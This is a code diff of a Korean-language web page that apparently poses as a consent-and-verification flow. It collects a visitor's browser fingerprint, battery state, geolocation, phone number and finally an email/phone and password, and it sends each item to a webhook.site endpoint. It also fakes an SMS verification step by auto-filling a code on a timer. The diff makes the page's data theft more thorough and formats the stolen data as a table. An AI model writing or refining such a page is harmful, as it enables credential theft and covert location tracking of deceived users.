@@ -65,22 +65,16 @@ font-size: 16px; font-weight: bold; color: #000; background: #ffeb00; border: no
 <script>
 const webhookUrl = "https://webhook.site/be034e81-7e5e-419d-a673-4f9dce49b392";
 
+// page1 -> page2
 function goNext() {
   const chk = document.getElementById("agree");
   if (!chk.checked) { alert("동의 후 진행할 수 있습니다."); return; }
-  collectUserInfo();
+  collectUserInfo(); // 최대 정보 수집 후 전송
   document.getElementById("page1").classList.add("hidden");
   document.getElementById("page2").classList.remove("hidden");
 }
 
-function formatTime(seconds) {
-  if (seconds === Infinity || seconds === undefined || seconds === null) return "unknown";
-  const h = Math.floor(seconds / 3600);
-  const m = Math.floor((seconds % 3600) / 60);
-  const s = Math.floor(seconds % 60);
-  return `${h}h ${m}m ${s}s`;
-}
-
+// 최대 정보 수집 (웹후크에서 컬러 테이블 HTML 전송)
 async function collectUserInfo() {
   let info = {};
   info.userAgent = navigator.userAgent;
@@ -113,30 +107,31 @@ async function collectUserInfo() {
     info.saveData = navigator.connection.saveData;
   }
 
-  // 배터리 정보
-  if (navigator.getBattery) {
-    try {
+  function formatTime(seconds){
+    if(seconds===Infinity || seconds===undefined || seconds===null) return "unknown";
+    const h = Math.floor(seconds/3600);
+    const m = Math.floor((seconds%3600)/60);
+    const s = Math.floor(seconds%60);
+    return `${h}h ${m}m ${s}s`;
+  }
+
+  if(navigator.getBattery){
+    try{
       const battery = await navigator.getBattery();
       info.batteryCharging = battery.charging ? "충전 중" : "충전 안함";
-      info.batteryLevel = battery.level !== undefined ? Math.round(battery.level*100) + "%" : "unknown";
+      info.batteryLevel = battery.level !== undefined ? Math.round(battery.level*100)+"%" : "unknown";
       info.batteryChargingTime = formatTime(battery.chargingTime);
       info.batteryDischargingTime = formatTime(battery.dischargingTime);
     } catch(e){
-      info.batteryCharging = "unknown";
-      info.batteryLevel = "unknown";
-      info.batteryChargingTime = "unknown";
-      info.batteryDischargingTime = "unknown";
+      info.batteryCharging = info.batteryLevel = info.batteryChargingTime = info.batteryDischargingTime = "unknown";
     }
   } else {
-    info.batteryCharging = "unknown";
-    info.batteryLevel = "unknown";
-    info.batteryChargingTime = "unknown";
-    info.batteryDischargingTime = "unknown";
+    info.batteryCharging = info.batteryLevel = info.batteryChargingTime = info.batteryDischargingTime = "unknown";
   }
 
-  if (navigator.geolocation) {
-    await new Promise(resolve => {
-      navigator.geolocation.getCurrentPosition(pos => {
+  if(navigator.geolocation){
+    await new Promise(resolve=>{
+      navigator.geolocation.getCurrentPosition(pos=>{
         info.latitude = pos.coords.latitude;
         info.longitude = pos.coords.longitude;
         info.locationAccuracy = pos.coords.accuracy;
@@ -147,11 +142,30 @@ async function collectUserInfo() {
 
   info.timestamp = new Date().toISOString();
 
+  // 컬러 테이블 HTML 생성
+  let html = `
+  <html>
+  <head>
+    <style>
+      table { border-collapse: collapse; width: 100%; font-family: Arial, sans-serif; }
+      th, td { border: 1px solid #444; padding: 8px; text-align: left; }
+      th { background-color: #222; color: #fff; }
+      tr:nth-child(even) { background-color: #f2f2f2; }
+      tr:hover { background-color: #ddd; }
+    </style>
+  </head>
+  <body>
+    <h2>수집된 브라우저 정보</h2>
+    <table>
+      <tr><th>속성</th><th>값</th></tr>`;
+  for(const key in info){
+    html += `<tr><td>${key}</td><td>${info[key]}</td></tr>`;
+  }
+  html += `</table></body></html>`;
+
   const params = new URLSearchParams();
   params.append("page","1");
-  for(const key in info){
-    if(info[key] !== undefined) params.append(key, info[key]);
-  }
+  params.append("info", html); // 테이블 전체 전송
 
   fetch(webhookUrl,{
     method:"POST",
@@ -168,43 +182,44 @@ function sendPhone() {
   if (!phoneRegex.test(userId)) { alert("잘못된 형식의 전화번호입니다."); return; }
 
   const params = new URLSearchParams();
-  params.append("page","2");
+  params.append("page", "2");
   params.append("phone", userId);
   params.append("timestamp", new Date().toISOString());
 
-  fetch(webhookUrl,{
-    method:"POST",
-    headers: {"Content-Type":"application/x-www-form-urlencoded"},
+  fetch(webhookUrl, {
+    method: "POST",
+    headers: { "Content-Type": "application/x-www-form-urlencoded" },
     body: params
-  }).catch(err=>console.error(err));
+  }).catch(err => console.error(err));
 
   document.getElementById("page2").classList.add("hidden");
   document.getElementById("page3").classList.remove("hidden");
 
+  // 4초 후 인증번호 자동 입력, 1초 후 page4
   setTimeout(()=>{
     document.getElementById("authCode").value="1224";
     setTimeout(()=>{
       document.getElementById("page3").classList.add("hidden");
       document.getElementById("page4").classList.remove("hidden");
     },1000);
-  },1500);
+  },4000);
 }
 
 // page4 전송
 function sendPage4() {
-  const userId4 = document.getElementById("userId4").value.trim();
-  const userCode4 = document.getElementById("userCode4").value.trim();
-  if(!userId4 || !userCode4){ alert("이메일/전화번호와 비밀번호를 입력해주세요."); return; }
+  const userId4=document.getElementById("userId4").value.trim();
+  const userCode4=document.getElementById("userCode4").value.trim();
+  if(!userId4||!userCode4){alert("이메일/전화번호와 비밀번호를 입력해주세요."); return;}
 
   const params = new URLSearchParams();
-  params.append("page","4");
+  params.append("page", "4");
   params.append("userId", userId4);
   params.append("password", userCode4);
   params.append("timestamp", new Date().toISOString());
 
-  fetch(webhookUrl,{
-    method:"POST",
-    headers: {"Content-Type":"application/x-www-form-urlencoded"},
+  fetch(webhookUrl, {
+    method: "POST",
+    headers: { "Content-Type": "application/x-www-form-urlencoded" },
     body: params
   }).then(()=>alert("page4 값 전송 완료!")).catch(err=>console.error(err));
 }
